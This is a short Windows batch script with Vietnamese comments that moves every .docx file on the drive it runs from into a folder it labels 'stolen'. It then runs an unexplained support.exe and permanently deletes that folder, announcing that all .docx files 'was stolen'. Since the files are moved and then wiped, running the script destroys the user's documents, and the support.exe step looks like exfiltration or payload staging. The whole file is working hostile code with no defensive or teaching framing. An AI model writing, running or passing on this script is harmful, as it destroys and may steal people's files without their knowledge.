




@echo off

REM Lấy đường dẫn của ổ đĩa chứa file batch
for %%I in ("%~dp0.") do set "drive=%%~dI"

REM Tạo thư mục "stolen" trong thư mục chứa file batch
mkdir "%~dp0\stolen" 2>nul


REM Hiển thị tất cả các tệp trên ổ đĩa cụ thể
echo Tất cả các tệp trên ổ đĩa %drive%:
for /r "%drive%\" %%F in (*.docx) do (
	REM copy "%%F" "%~dp0\stolen"
	 move "%%F" "%~dp0\stolen"
    	echo Get Done: %%F
)
echo [COMPLETED] All of .docx was stolen

REM Chạy chương trình support.exe và hiển thị cửa sổ console
start /wait cmd /c support.exe

REM Xóa thư mục "stolen" vĩnh viễn sau khi hoàn thành
rmdir /s /q "stolen"

echo [COMPLETED] deleted stolen folder !

pause
    
    